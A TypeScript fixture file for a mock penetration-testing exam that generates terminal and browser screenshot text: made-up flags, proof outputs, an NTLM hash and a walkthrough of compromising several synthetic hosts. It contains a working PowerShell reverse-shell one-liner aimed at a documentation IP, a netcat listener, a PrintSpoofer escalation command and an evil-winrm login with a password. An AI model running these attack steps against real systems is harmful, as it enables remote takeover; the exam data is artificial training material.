// The mock exam's terminal and browser text, shared by the fixtures (command output, proof text) and the screenshot
// renderer (src/audit/images/shots.mjs), so a screenshot shows exactly what its entry says. Synthetic throughout:
// invented 10.10.30.x targets, the RFC 5737 attacker 192.0.2.10, made-up flags, hashes and passwords.

/** A PowerShell -e payload: the command as UTF-16LE base64, as powershell.exe expects it. */
const encoded = (command: string) => btoa([...command].map((c) => `${c}\0`).join(""));
export const REVERSE_SHELL_B64 = encoded(
  "$c=New-Object Net.Sockets.TCPClient('192.0.2.10',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};" +
    "while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);" +
    "$o=(iex $d 2>&1|Out-String);$r=$o+'PS '+(pwd).Path+'> ';$y=([text.encoding]::ASCII).GetBytes($r);$s.Write($y,0,$y.Length)}",
);

const winIp = (ip: string) =>
  [
    "",
    "Windows IP Configuration",
    "",
    "",
    "Ethernet adapter Ethernet0:",
    "",
    "   Connection-specific DNS Suffix  . :",
    `   IPv4 Address. . . . . . . . . . . : ${ip}`,
    "   Subnet Mask . . . . . . . . . . . : 255.255.255.0",
    "   Default Gateway . . . . . . . . . : 10.10.30.254",
  ].join("\n");

const linuxIp = (ip: string, iface = "ens160") =>
  [
    "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000",
    "    inet 127.0.0.1/8 scope host lo",
    `2: ${iface}: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000`,
    "    link/ether 00:50:56:8a:4c:1e brd ff:ff:ff:ff:ff:ff",
    `    inet ${ip}/24 brd 10.10.30.255 scope global ${iface}`,
  ].join("\n");

export const FLAGS = {
  ms01Local: "5f3c9a1e7d2b48c6a0e1f9d3b7c2a4e8",
  ms01Proof: "c81e728d9d4c2f636f067f89cc14862c",
  web01Local: "9b2e4f61c0d87a35e1f4b6c9d2a0e7f3",
  web01Proof: "e4da3b7fbbce2345d7772b0674a318d5",
  ad02Proof: "1679091c5a880faf6fb5e6087eb1b2dc",
  dc01Proof: "8f14e45fceea167a5a36dedd4bea2543",
} as const;

export const DA_NTLM = "7f1e4bd3c2a95e608d1f2b4c6a8e0d93";

/** Pasted proof text of each flag entry: what the proof screenshot shows. */
export const PROOF = {
  ms01Local: [
    "PS C:\\windows\\system32\\inetsrv> cd C:\\Users\\Public\\Desktop",
    "PS C:\\Users\\Public\\Desktop> type local.txt",
    FLAGS.ms01Local,
    "PS C:\\Users\\Public\\Desktop> whoami",
    "iis apppool\\defaultapppool",
    "PS C:\\Users\\Public\\Desktop> hostname",
    "MS01",
    "PS C:\\Users\\Public\\Desktop> ipconfig",
    winIp("10.10.30.5"),
  ].join("\n"),
  // Read at the Desktop prompt with no cd in the paste: the PowerShell prompt itself names the folder.
  ms01Proof: [
    "PS C:\\Users\\Administrator\\Desktop> type proof.txt",
    FLAGS.ms01Proof,
    "PS C:\\Users\\Administrator\\Desktop> whoami",
    "nt authority\\system",
    "PS C:\\Users\\Administrator\\Desktop> hostname",
    "MS01",
    "PS C:\\Users\\Administrator\\Desktop> ipconfig",
    winIp("10.10.30.5"),
  ].join("\n"),
  // The bash prompt shows ~ for the user's home, as it does on a real box.
  web01Local: [
    "dev@web01:~$ cat local.txt",
    FLAGS.web01Local,
    "dev@web01:~$ id",
    "uid=1000(dev) gid=1000(dev) groups=1000(dev)",
    "dev@web01:~$ hostname",
    "web01",
    "dev@web01:~$ ip addr",
    linuxIp("10.10.30.20"),
  ].join("\n"),
  web01Proof: [
    "root@web01:~# cat /root/proof.txt",
    FLAGS.web01Proof,
    "root@web01:~# id",
    "uid=0(root) gid=0(root) groups=0(root)",
    "root@web01:~# hostname",
    "web01",
    "root@web01:~# ip addr",
    linuxIp("10.10.30.20"),
  ].join("\n"),
  ad02Proof: [
    "*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> type proof.txt",
    FLAGS.ad02Proof,
    "*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> whoami",
    "exam\\svc_deploy",
    "*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> hostname",
    "AD02",
    "*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> ipconfig",
    winIp("10.10.30.11"),
  ].join("\n"),
  dc01Proof: [
    "C:\\Windows\\system32> type C:\\Users\\Administrator\\Desktop\\proof.txt",
    FLAGS.dc01Proof,
    "C:\\Windows\\system32> whoami",
    "nt authority\\system",
    "C:\\Windows\\system32> hostname",
    "DC01",
    "C:\\Windows\\system32> ipconfig",
    winIp("10.10.30.10"),
  ].join("\n"),
} as const;

/** Terminal output of the steps a screenshot was taken of. */
export const OUTPUT = {
  ms01Shell: [
    "listening on [any] 443 ...",
    "connect to [192.0.2.10] from (UNKNOWN) [10.10.30.5] 49718",
    "",
    "PS C:\\windows\\system32\\inetsrv> whoami",
    "iis apppool\\defaultapppool",
    "PS C:\\windows\\system32\\inetsrv> hostname",
    "MS01",
  ].join("\n"),
  ms01System: [
    "[+] Found privilege: SeImpersonatePrivilege",
    "[+] Named pipe listening...",
    "[+] CreateProcessAsUser() OK",
    "Windows PowerShell",
    "Copyright (C) Microsoft Corporation. All rights reserved.",
    "",
    "PS C:\\Windows\\system32> whoami",
    "nt authority\\system",
  ].join("\n"),
  ad02Winrm: [
    "Evil-WinRM shell v3.5",
    "",
    "Info: Establishing connection to remote endpoint",
    "*Evil-WinRM* PS C:\\Users\\j.ellis\\Documents> whoami",
    "exam\\j.ellis",
    "*Evil-WinRM* PS C:\\Users\\j.ellis\\Documents> hostname",
    "AD02",
  ].join("\n"),
} as const;

export type ShotKind = "terminal" | "browser";
export interface ShotText {
  kind: ShotKind;
  /** The window title (terminal) or the address bar (browser). */
  title: string;
  text: string;
}

/** Every screenshot the mock exam logs, keyed as the attachment (`a-<key>`). */
export const EXAM_SHOTS: Record<string, ShotText> = {
  "ms01-umbraco": {
    kind: "browser",
    title: "http://10.10.30.5/umbraco/#/login",
    text: "Umbraco 7.12.4\n\nSign in to Umbraco\n\nEmail\nPassword\n\nSIGN IN\n\nForgotten password?",
  },
  "ms01-shell": { kind: "terminal", title: "kali@kali: ~/exam/ms01", text: `kali@kali:~/exam/ms01$ rlwrap nc -lvnp 443\n${OUTPUT.ms01Shell}` },
  "ms01-local": { kind: "terminal", title: "kali@kali: ~/exam/ms01", text: PROOF.ms01Local },
  "ms01-system": { kind: "terminal", title: "kali@kali: ~/exam/ms01", text: `PS C:\\Windows\\Tasks> .\\PrintSpoofer64.exe -i -c powershell.exe\n${OUTPUT.ms01System}` },
  "ms01-proof": { kind: "terminal", title: "kali@kali: ~/exam/ms01", text: PROOF.ms01Proof },
  "web01-local": { kind: "terminal", title: "dev@web01: ~", text: PROOF.web01Local },
  "web01-proof": { kind: "terminal", title: "root@web01: ~", text: PROOF.web01Proof },
  "ad02-winrm": { kind: "terminal", title: "kali@kali: ~/exam/ad", text: `kali@kali:~/exam/ad$ evil-winrm -i 10.10.30.11 -u j.ellis -p 'Welcome2026!'\n\n${OUTPUT.ad02Winrm}` },
  "ad02-proof": { kind: "terminal", title: "kali@kali: ~/exam/ad", text: PROOF.ad02Proof },
  "dc01-proof": { kind: "terminal", title: "kali@kali: ~/exam/ad", text: PROOF.dc01Proof },
};
